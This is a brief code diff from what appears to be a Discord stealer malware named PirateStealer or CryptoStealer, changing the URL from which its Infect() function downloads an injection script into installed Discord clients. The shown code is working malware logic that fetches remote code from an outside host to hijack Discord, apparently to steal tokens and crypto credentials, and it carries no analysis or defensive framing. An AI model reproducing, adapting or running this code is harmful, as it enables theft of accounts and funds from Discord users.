@@ -38,7 +38,7 @@ discords.forEach(function(file) {
 listDiscords(); // Made by https://github.com/CryptoWare38/CryptoStealer 
 
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/injection/injection-clean.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/CryptoWare38/CryptoStealer/main/src/injection/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
